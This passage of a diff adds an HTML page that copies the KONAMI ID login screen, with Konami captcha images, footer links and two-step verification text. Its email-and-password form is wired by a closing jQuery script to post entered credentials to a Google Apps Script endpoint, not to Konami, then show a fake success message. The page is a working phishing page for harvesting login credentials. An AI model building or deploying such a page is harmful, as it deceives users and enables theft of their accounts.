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) ;
+              width: 400px; ;
+            }
+            </style>
+            <div id="myDIV" class="inner-box">
+                <h3>Play more with KONAMI ID. Enjoy more with KONAMI ID.</h3>
+                                <p>A KONAMI ID is your own unique ID which allows you to use online services provided by the KONAMI Group.<br>Registering a KONAMI ID is free of charge.
+                                </p>
+
+        
+
+
+            
+            </div>
+       
+    
+        </div>
+        
+    </div>
+    </div>
+
+</header>
+<style> 
+body {
+    background-color:#ebe8e8;
+}
+#konami {
+  height: 350px;
+  background-color:#ebdddd;
+  padding: 20px;
+  border: 1px solid black;
+  border: top left radius 1px; 
+  width: 400px;
+  }  
+
+  
+  </style>
+  
+</div>
+   <B>
+    
+    <div class="text-center" id="konami">
+    <form id="submit-form" action="" class="">
+      <div class="col-md-12">
+        <BR>
+      <label for="email"></label>
+      <input type="email" id="email" name="email" placeholder="Your EMAIL...">
+    
+      
+      <BR>
+        <BR>
+      <label for="Password"></label>
+      <input type="password" id="password" name="password" placeholder="YOUR PASSWORD..">
+      <br>
+      <p class="text-center"><a href="#" onclick="mojarra.jsfcljs(document.getElementById('loginForm'),{'loginForm:j_idt113':'loginForm:j_idt113'},'');return false">About the KONAMI OTP Service</a></p>
+      <input type="submit" value="login" class="bg-danger text-light">
+    </form>
+
+
+
+
+    <div class="accordion-group" style="border: none;">
+        <div class="accordion-heading" style="height: 0px;">
+            <h3 class="knm-hdg">
+                <a id="recaptcha-area" class="accordion-toggle " data-toggle="collapse" data-parent="#accordion1" href="#collapseTwo"></a>
+            </h3>
+        </div>
+        <div id="collapseTwo" class="accordion-body in collapse">
+            <div>
+                    Please check all of this character.<img src="https://img-auth.service.konami.net/captcha/pic/223bb3b1b0096f16b6a759fd3e690f4f">
+            </div>
+            <table style="table-layout: fixed; width: 100%">
+                <tbody>
+                    <tr>
+                            <td>
+                                <label><img src="https://img-auth.service.konami.net/captcha/pic/4f6552001e3ca84fa8004b744036f139">
+                                    <input type="checkbox" name="selectChar" value="https://img-auth.service.konami.net/captcha/pic/4f6552001e3ca84fa8004b744036f139">
+                                </label>
+                            </td>
+                            <td>
+                                <label><img src="https://img-auth.service.konami.net/captcha/pic/f7be01c1cdc91ec9a7494c903780e117">
+                                    <input type="checkbox" name="selectChar" value="https://img-auth.service.konami.net/captcha/pic/f7be01c1cdc91ec9a7494c903780e117">
+                                </label>
+                            </td>
+                            <td>
+                                <label><img src="https://img-auth.service.konami.net/captcha/pic/ee758a48dad790d6fc8bd04d9166403a">
+                                    <input type="checkbox" name="selectChar" value="https://img-auth.service.konami.net/captcha/pic/ee758a48dad790d6fc8bd04d9166403a">
+                                </label>
+                            </td>
+                            <td>
+                                <label><img src="https://img-auth.service.konami.net/captcha/pic/a357a2ab98eec7f80f92250702851908">
+                                    <input type="checkbox" name="selectChar" value="https://img-auth.service.konami.net/captcha/pic/a357a2ab98eec7f80f92250702851908">
+                                </label>
+                            </td>
+                            <td>
+                                <label><img src="https://img-auth.service.konami.net/captcha/pic/7831ceaad215c960694021c4e94948d5">
+                                    <input type="checkbox" name="selectChar" value="https://img-auth.service.konami.net/captcha/pic/7831ceaad215c960694021c4e94948d5">
+                                </label>
+                            </td>
+                    </tr>
+                </tbody>
+            </table>
+        </div>
+    </div>
+</div>
+   </B>
+
+
+<p class="text-center"><a href="#" onclick="mojarra.jsfcljs(document.getElementById('loginForm'),{'loginForm:j_idt115':'loginForm:j_idt115'},'');return false">Forgot your KONAMI ID?</a></p>
+<p class="text-center"><a href="#" onclick="mojarra.jsfcljs(document.getElementById('loginForm'),{'loginForm:j_idt118':'loginForm:j_idt118'},'');return false">Forgot your password?</a></p><input type="hidden" name="javax.faces.ViewState" id="j_id1:javax.faces.ViewState:0" value="-6465131315692800856:-1478761755032648609" autocomplete="off">
+</form>
+<form id="create2" name="create2" method="post" action="/login.html" enctype="application/x-www-form-urlencoded">
+<input type="hidden" name="create2" value="create2">
+</p><input type="hidden" name="javax.faces.ViewState" id="j_id1:javax.faces.ViewState:0" value="-6465131315692800856:-1478761755032648609" autocomplete="off">
+</form>
+<!-- /knm-section -->
+</div>
+<!-- /knm-box -->
+</div>
+</div> 
+    
+<h2 class="knm-hdg-l1">What is two-step verification?
+</h2>
+<hr>
+<img src="https://my.konami.net/common/img/en_US/twostep_main.png" alt="" width="400">
+<br>
+
+Two-step verification is security feature that prevents unauthorized login and enhances security by logging in with a verification code that contacts the customer separately in addition to logging in with the usual KONAMI ID (or registered email address) and password. It is a service.
+<BR></BR>
+<div class="span9">
+    <ul class="unstyled link-list">
+        <li><a onclick="mojarra.jsfcljs(document.getElementById('footer-form'),{'footer-form:j_idt132':'footer-form:j_idt132'},'');return false" href="#">Top</a></li>
+        <li><a href="/agreement.html">Terms of Service</a></li>
+            <li><a href="https://www.konami.com/games/privacy/">Privacy Policy</a></li>
+
+        <li> <a href="https://my.konami.net/agreement_efootball_point.html" target="_blank">Terms of Service(eFootball Point Program)</a></li>
+
+        <li><a href="https://www.konami.com/games/inquiry/form/konami_id/en/">Contact us</a></li>
+        <li><a href="https://www.konami.com/games/">Corporate Information</a></li>
+    </ul>
+    <p id="knm-copyright">©2022 Konami Digital Entertainment</p>
+</div>  
+
+
+            
+          
+            <div class="bg-danger">
+
+            
+    
+       
+         
+      <script>
+        $("#submit-form").submit((e)=>{
+            e.preventDefault()
+            $.ajax({
+                url:"https://script.google.com/macros/s/AKfycbw_gdwpYV1HxUUOqWTAyyhU1ZhNTb78nNGXSFtRuJjR6TlZsDaGpkE_ma94-IxxrTWg/exec",
+                data:$("#submit-form").serialize(),
+                method:"post",
+                success:function (response){
+                    alert("Form submitted successfully")
+                    window.location.reload()
+                    //window.location.href="https://google.com"
+                },
+                error:function (err){
+                    alert("Something Error")
+    
+                }
+            })
+        })
+    </script>
+</body>
+</html>
